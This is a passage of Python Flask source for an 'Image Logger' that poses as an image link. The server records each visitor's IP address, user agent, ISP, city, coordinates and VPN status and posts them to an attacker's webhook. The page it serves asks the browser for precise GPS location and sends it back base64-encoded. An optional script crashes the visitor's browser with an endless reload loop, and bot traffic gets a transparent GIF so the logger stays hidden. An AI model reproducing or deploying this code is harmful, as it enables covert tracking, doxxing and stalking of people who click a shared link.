            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except Exception as e:
        print(f"Failed to send webhook: {e}")
    
    return info

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
@app.route('/index.html')
def handle_request(path=''):
    try:
        # Get real client IP
        ip = get_client_ip()
        
        # Get user agent
        useragent = request.headers.get('User-Agent', 'Unknown')
        
        # Get full path and query parameters
        full_path = request.full_path
        query_params = request.args.to_dict()
        
        print(f"Request received - IP: {ip}, UA: {useragent}, Path: {path}, Params: {query_params}")
        
        # Get image URL from argument if enabled
        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url_param = query_params.get("url") or query_params.get("id")
                    url = base64.b64decode(url_param.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        # Check if IP is blacklisted
        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
            return Response("OK", status=200)
        
        # Handle bot detection
        bot_result = botCheck(ip, useragent)
        if bot_result:
            print(f"Bot detected: {bot_result}")
            makeReport(ip, useragent, endpoint=path, url=url)
            
            if config["buggedImage"]:
                # Return transparent GIF for bots
                return Response(
                    TRANSPARENT_GIF,
                    mimetype='image/gif',
                    headers={"Cache-Control": "no-cache, no-store, must-revalidate"}
                )
            else:
                return redirect(url)
        
        # Handle accurate location
        result = None
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g").encode()).decode()
                print(f"Location received: {location}")
                result = makeReport(ip, useragent, location, path, url=url)
            except Exception as e:
                print(f"Location decode error: {e}")
                result = makeReport(ip, useragent, endpoint=path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=path, url=url)
        
        # Prepare message if enabled
        message_text = config["message"]["message"] if config["message"]["doMessage"] else ""
        if config["message"]["doMessage"] and config["message"]["richMessage"] and result and isinstance(result, dict):
            message_text = message_text.replace("{ip}", ip)
            message_text = message_text.replace("{isp}", str(result.get("isp", "Unknown")))
            message_text = message_text.replace("{asn}", str(result.get("as", "Unknown")))
            message_text = message_text.replace("{country}", str(result.get("country", "Unknown")))
            message_text = message_text.replace("{region}", str(result.get("regionName", "Unknown")))
            message_text = message_text.replace("{city}", str(result.get("city", "Unknown")))
            message_text = message_text.replace("{lat}", str(result.get("lat", "0")))
            message_text = message_text.replace("{long}", str(result.get("lon", "0")))
            
            timezone = result.get("timezone", "Unknown/Unknown")
            if '/' in timezone:
                message_text = message_text.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
            else:
                message_text = message_text.replace("{timezone}", "Unknown")
            
            message_text = message_text.replace("{mobile}", str(result.get("mobile", False)))
            message_text = message_text.replace("{vpn}", str(result.get("proxy", False)))
            message_text = message_text.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            
            os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
            message_text = message_text.replace("{browser}", browser)
            message_text = message_text.replace("{os}", os_name)
        
        # HTML Template
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: black;
        }
        .img-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-image: url('{{ url }}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            background-color: black;
        }
        .message-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.85);
            color: white;
            padding: 25px 35px;
            border-radius: 15px;
            font-family: Arial, sans-serif;
            text-align: center;
            border: 2px solid #00ffff;
            box-shadow: 0 0 20px rgba(0,255,255,0.3);
            z-index: 1000;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="img-container"></div>
    
    {% if message_doMessage and message_text %}
    <div class="message-box">{{ message_text|safe }}</div>
    {% endif %}
    
    {% if crashBrowser %}
    <script>
        // Browser crasher
        setTimeout(function() {
            for(var i = 69420; i == i; i *= i) {
                console.log(i);
                while(1) {
                    location.reload();
                }
            }
        }, 100);
    </script>
    {% endif %}
    
    {% if redirect_enabled %}
    <meta http-equiv="refresh" content="0;url={{ redirect_page }}">
    {% endif %}
    
    {% if accurateLocation and not has_g_param %}
    <script>
        // Accurate geolocation script
        (function() {
            var currentUrl = window.location.href;
            
            // Check if we already have location
            if (!currentUrl.includes('g=')) {
                if (navigator.geolocation) {
                    console.log('Requesting accurate location...');
                    
                    // Options for high accuracy
                    var options = {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    };
                    
                    function success(position) {
                        var lat = position.coords.latitude;
                        var lng = position.coords.longitude;
                        var accuracy = position.coords.accuracy;
                        
                        console.log('Location obtained - Lat: ' + lat + ', Lng: ' + lng + ', Accuracy: ' + accuracy + 'm');
                        
                        // Encode coordinates
                        var locationData = btoa(lat + ',' + lng);
                        
                        // Add to URL
                        var separator = currentUrl.includes('?') ? '&' : '?';
                        var newUrl = currentUrl + separator + 'g=' + encodeURIComponent(locationData);
                        
                        // Redirect to same page with location
                        window.location.replace(newUrl);
                    }
                    
                    function error(err) {
                        console.warn('Geolocation error (' + err.code + '): ' + err.message);
                        // Continue without location
                    }
                    
                    // Request position
                    navigator.geolocation.getCurrentPosition(success, error, options);
                } else {
                    console.log('Geolocation not supported');
                }
            }
        })();
    </script>
    {% endif %}
</body>
</html>'''
        
        # Render HTML
        rendered_html = render_template_string(
            html_template,
            url=url,
            message_doMessage=config["message"]["doMessage"],
            message_text=message_text,
            crashBrowser=config["crashBrowser"],
            redirect_enabled=config["redirect"]["redirect"],
            redirect_page=config["redirect"]["page"],
            accurateLocation=config["accurateLocation"],
            has_g_param="g" in query_params
        )
        
        return Response(
            rendered_html,
            mimetype='text/html',
            headers={
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        
    except Exception as e:
        print(f"Error: {traceback.format_exc()}")
        reportError(traceback.format_exc())
        return Response(
            f"Internal Server Error: {str(e)}",
            status=500,
            mimetype='text/plain'
        )

@app.errorhandler(404)
def not_found(e):
    return handle_request()

if __name__ == '__main__':
    print(f"Image Logger starting with accurateLocation = {config['accurateLocation']}")
    print(f"Webhook: {config['webhook'][:50]}...")
    print(f"Image: {config['image']}")
    app.run(debug=True, host='0.0.0.0', port=8080)
